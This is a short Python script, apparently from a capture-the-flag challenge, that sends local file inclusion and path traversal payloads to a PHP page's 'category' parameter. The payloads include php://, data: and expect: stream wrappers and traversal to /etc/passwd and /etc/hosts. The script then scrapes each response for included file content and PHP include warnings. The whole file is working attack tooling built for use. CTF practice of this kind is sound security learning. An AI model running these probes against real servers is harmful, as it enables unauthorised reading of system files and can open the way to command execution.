"""Round 7: discriminators for the 502 trigger."""
import re
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="

PAYLOADS = [
    "php://",
    "php://x",
    "data:",
    "expect:",
    "etc/passwd",
    "woofers/../../../../etc/hosts",
    "woofers/../THEDIR",           # nonexistent dir traversal
    "zlib://x",
    "compress.zlib://x",
]


def fetch(qs):
    url = BASE + qs
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


for qs in PAYLOADS:
    status, body = fetch(qs)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:250]
        if "Sorry" in body:
            note += " [SORRY]"
        if "Warning" in body:
            wm = re.search(r"include\([^)]{0,160}", body)
            note += " [WARN: " + (wm.group(0) if wm else "?") + "]"
    print(f"[{status}] {qs!r}\n      {note}\n")
